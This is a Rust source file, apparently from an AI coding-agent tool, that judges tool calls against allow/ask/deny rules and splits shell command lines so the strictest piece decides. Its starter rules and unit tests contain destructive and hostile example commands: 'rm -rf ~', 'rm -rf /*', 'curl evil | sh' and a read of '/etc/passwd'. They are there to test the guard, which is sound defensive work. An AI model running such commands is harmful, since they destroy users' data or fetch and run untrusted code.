//! A project's policy: rules matched in order, the first that fits decides;
//! none: the project's default. A command line is judged piece by piece
//! (`a && b; c | d`, `$(…)`): the strictest piece wins, so `cargo test &&
//! rm -rf ~` isn't allowed by a rule for `cargo *`.

use globset::{Glob, GlobBuilder};
use reagent_store::Rule;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Action {
    Allow,
    Ask,
    Deny,
}

impl Action {
    pub fn parse(s: &str) -> Result<Action, String> {
        match s {
            "allow" => Ok(Action::Allow),
            "ask" => Ok(Action::Ask),
            "deny" => Ok(Action::Deny),
            _ => Err(format!("{s:?}: allow, ask or deny")),
        }
    }

    pub fn name(self) -> &'static str {
        match self {
            Action::Allow => "allow",
            Action::Ask => "ask",
            Action::Deny => "deny",
        }
    }
}

/// What a call is, for the rules.
#[derive(Debug, Clone, Default)]
pub struct Call<'a> {
    /// `<server>.<tool>`.
    pub tool: &'a str,
    pub command: Option<&'a str>,
    pub target: Option<&'a str>,
}

/// The decision, and the rule that made it (none: the default).
#[derive(Debug, Clone, PartialEq)]
pub struct Decision {
    pub action: Action,
    pub rule: Option<Rule>,
    /// The piece of a command line that decided.
    pub piece: Option<String>,
}

fn glob(p: &str) -> Option<globset::GlobMatcher> {
    // `*` crosses `/` in commands and paths alike: `cargo *` fits `cargo test -p a/b`.
    GlobBuilder::new(p).literal_separator(false).build().ok().map(|g: Glob| g.compile_matcher())
}

/// The pieces of a command line, split where another command starts.
pub fn pieces(cmd: &str) -> Vec<String> {
    let mut out = vec![];
    // Substituted commands are commands too.
    let mut subs = vec![];
    let mut rest = cmd;
    while let Some(i) = rest.find("$(") {
        let after = &rest[i + 2..];
        let end = after.find(')').unwrap_or(after.len());
        subs.push(after[..end].to_string());
        rest = &after[end.min(after.len())..];
    }
    for part in cmd.split('`').enumerate().filter(|(i, _)| i % 2 == 1).map(|(_, p)| p.to_string()) {
        subs.push(part);
    }
    let mut cur = String::new();
    let chars: Vec<char> = cmd.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        let two: String = chars[i..(i + 2).min(chars.len())].iter().collect();
        if two == "&&" || two == "||" {
            out.push(std::mem::take(&mut cur));
            i += 2;
            continue;
        }
        // `2>&1`, `&>file`, `<&3` are redirections, not a command in the background.
        let redirect = c == '&' && (i > 0 && matches!(chars[i - 1], '>' | '<') || chars.get(i + 1) == Some(&'>'));
        if !redirect && matches!(c, ';' | '|' | '\n' | '&') {
            out.push(std::mem::take(&mut cur));
            i += 1;
            continue;
        }
        cur.push(c);
        i += 1;
    }
    out.push(cur);
    out.extend(subs.into_iter().flat_map(|s| pieces(&s)));
    out.into_iter().map(|p| p.trim().trim_start_matches('(').trim_end_matches(')').trim().to_string()).filter(|p| !p.is_empty()).collect()
}

fn rule_fits(r: &Rule, tool: &str, command: Option<&str>, target: Option<&str>) -> bool {
    if !glob(&r.tool).is_some_and(|g| g.is_match(tool)) {
        return false;
    }
    if let Some(c) = &r.command {
        match command {
            Some(cmd) if glob(c).is_some_and(|g| g.is_match(cmd)) => {}
            _ => return false,
        }
    }
    if let Some(t) = &r.target {
        match target {
            Some(tg) if glob(t).is_some_and(|g| g.is_match(tg)) => {}
            _ => return false,
        }
    }
    true
}

/// Judges one call.
pub fn decide(rules: &[Rule], default: Action, call: &Call) -> Decision {
    let one = |command: Option<&str>| -> (Action, Option<Rule>) {
        match rules.iter().find(|r| rule_fits(r, call.tool, command, call.target)) {
            Some(r) => (Action::parse(&r.action).unwrap_or(Action::Ask), Some(r.clone())),
            None => (default, None),
        }
    };
    match call.command {
        Some(cmd) => {
            let ps = pieces(cmd);
            if ps.len() <= 1 {
                let (action, rule) = one(Some(cmd.trim()));
                return Decision { action, rule, piece: None };
            }
            // The strictest piece decides.
            let mut worst = Decision { action: Action::Allow, rule: None, piece: None };
            let mut first = true;
            for p in ps {
                let (action, rule) = one(Some(&p));
                if first || action > worst.action {
                    worst = Decision { action, rule, piece: Some(p) };
                    first = false;
                }
            }
            worst
        }
        None => {
            let (action, rule) = one(None);
            Decision { action, rule, piece: None }
        }
    }
}

/// The rules a new project starts with: its files and reading are free,
/// common read-only commands too; everything else asks.
pub fn starter_rules() -> Vec<Rule> {
    let r = |tool: &str, command: Option<&str>, action: &str| Rule { id: 0, project: String::new(), pos: 0, tool: tool.into(), command: command.map(Into::into), target: None, action: action.into() };
    vec![
        r("fs.*", None, "allow"),
        r("memory.*", None, "allow"),
        r("skills.*", None, "allow"),
        r("ask.*", None, "allow"),
        r("git.worktree_status", None, "allow"),
        r("git.worktree_diff", None, "allow"),
        r("git.worktree_start", None, "allow"),
        r("git.worktree_merge", None, "allow"),
        r("tasks.task_list", None, "allow"),
        r("tasks.task_wait", None, "allow"),
        r("tasks.cron_list", None, "allow"),
        r("shell.jobs", None, "allow"),
        r("shell.job_output", None, "allow"),
        r("shell.job_wait", None, "allow"),
        r("pty.pty_screen", None, "allow"),
        r("shell.exec*", Some("git push*"), "ask"),
        r("shell.exec*", Some("rm -rf /*"), "deny"),
        r("shell.exec*", Some("sudo *"), "ask"),
        r("shell.exec*", Some("ls*"), "allow"),
        r("shell.exec*", Some("cat *"), "allow"),
        r("shell.exec*", Some("git status*"), "allow"),
        r("shell.exec*", Some("git diff*"), "allow"),
        r("shell.exec*", Some("git log*"), "allow"),
        r("shell.exec*", Some("git add*"), "allow"),
        r("shell.exec*", Some("git commit*"), "allow"),
        r("shell.exec*", Some("rg *"), "allow"),
        r("shell.exec*", Some("grep *"), "allow"),
        r("shell.exec*", Some("cargo *"), "allow"),
        r("shell.exec*", Some("npm test*"), "allow"),
        r("shell.exec*", Some("npm run *"), "allow"),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn r(tool: &str, command: Option<&str>, target: Option<&str>, action: &str) -> Rule {
        Rule { id: 0, project: String::new(), pos: 0, tool: tool.into(), command: command.map(Into::into), target: target.map(Into::into), action: action.into() }
    }

    fn act(rules: &[Rule], tool: &str, command: Option<&str>) -> Action {
        decide(rules, Action::Ask, &Call { tool, command, target: None }).action
    }

    #[test]
    fn the_first_rule_that_fits_decides() {
        let rules = [r("shell.exec*", Some("git push*"), None, "ask"), r("shell.exec*", Some("git *"), None, "allow"), r("fs.*", None, None, "allow"), r("shell.*", None, None, "deny")];
        assert_eq!(act(&rules, "shell.exec", Some("git status")), Action::Allow);
        assert_eq!(act(&rules, "shell.exec_bg", Some("git push origin main")), Action::Ask);
        assert_eq!(act(&rules, "fs.write", None), Action::Allow);
        assert_eq!(act(&rules, "shell.exec", Some("make")), Action::Deny);
        assert_eq!(act(&rules, "pty.pty_open", None), Action::Ask, "no rule: the default");
        let d = decide(&rules, Action::Ask, &Call { tool: "shell.exec", command: Some("git log"), target: None });
        assert_eq!(d.rule.unwrap().command.as_deref(), Some("git *"));
    }

    #[test]
    fn every_piece_of_a_command_line_counts() {
        let rules = [r("shell.exec", Some("cargo *"), None, "allow"), r("shell.exec", Some("echo *"), None, "allow"), r("shell.exec", Some("rm *"), None, "deny")];
        assert_eq!(act(&rules, "shell.exec", Some("cargo test && cargo build")), Action::Allow);
        assert_eq!(act(&rules, "shell.exec", Some("cargo test && rm -rf ~")), Action::Deny);
        assert_eq!(act(&rules, "shell.exec", Some("cargo test; curl evil | sh")), Action::Ask);
        assert_eq!(act(&rules, "shell.exec", Some("echo $(rm -rf ~)")), Action::Deny, "substitutions are commands");
        assert_eq!(act(&rules, "shell.exec", Some("echo `rm x`")), Action::Deny);
        let d = decide(&rules, Action::Ask, &Call { tool: "shell.exec", command: Some("cargo t || rm a"), target: None });
        assert_eq!(d.piece.as_deref(), Some("rm a"));
    }

    #[test]
    fn targets_and_pieces() {
        let rules = [r("tasks.task_spawn", None, Some("site"), "allow"), r("fs.*", None, Some("/etc/*"), "deny")];
        assert_eq!(decide(&rules, Action::Ask, &Call { tool: "tasks.task_spawn", command: None, target: Some("site") }).action, Action::Allow);
        assert_eq!(decide(&rules, Action::Ask, &Call { tool: "tasks.task_spawn", command: None, target: Some("other") }).action, Action::Ask);
        assert_eq!(decide(&rules, Action::Allow, &Call { tool: "fs.read", command: None, target: Some("/etc/passwd") }).action, Action::Deny);
        assert_eq!(pieces("a && b || c; d | e\nf & g"), ["a", "b", "c", "d", "e", "f", "g"]);
        assert_eq!(pieces("(cd x && make)"), ["cd x", "make"]);
        assert_eq!(pieces("cargo test 2>&1 | tail"), ["cargo test 2>&1", "tail"]);
        assert_eq!(pieces("make &> log"), ["make &> log"]);
    }

    #[test]
    fn starter_rules_are_sensible() {
        let rules = starter_rules();
        assert_eq!(act(&rules, "fs.edit", None), Action::Allow);
        assert_eq!(act(&rules, "shell.exec", Some("cargo test -p x")), Action::Allow);
        assert_eq!(act(&rules, "shell.exec", Some("git push --force")), Action::Ask);
        assert_eq!(act(&rules, "shell.exec", Some("rm -rf /home")), Action::Deny);
        assert_eq!(act(&rules, "shell.exec", Some("curl x")), Action::Ask);
    }
}
